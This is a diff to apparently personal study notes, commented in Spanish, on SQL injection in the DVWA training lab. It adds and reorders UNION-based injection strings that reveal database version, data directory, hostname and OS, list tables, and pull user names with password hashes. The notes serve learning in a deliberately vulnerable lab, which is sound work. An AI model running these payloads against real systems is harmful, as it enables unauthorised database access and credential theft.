@@ -40,9 +40,12 @@ Finding the Number of Columns
 
 Now that we know the number of columns, we can use a UNION query to fetch table names from the database:
 ejemplos
-' UNION select first_name, password from users-- '
+' UNION ALL SELECT @@datadir, 1 -- ' <-- muestra tipo y direccion de la BD
 ' union all select 1,@@VERSION-- '  <-- muestra la versión de la base de datos
 ' union all select 1,database()'    <-- muestra el nombre de la base de datos
+' UNION ALL SELECT @@hostname, @@version_compile_os -- ' <-- tipo de SO y version del host anfitrion
+
+' UNION select first_name, password from users-- '
 %' and 1=0 union select null, table_name from information_schema.tables # <-- muestra las tablas de lA BD
 %' or 0=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users # <-- obtiene los hash de las  password
 
@@ -80,6 +83,7 @@ https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa
 https://github.com/LeonardoE95/DVWA
 https://www.linkedin.com/pulse/command-injection-dvwa-series-nguyen-nguyen
 https://4g3nt47.github.io/categories/dvwa/
+https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson15/index.html
 
 
 
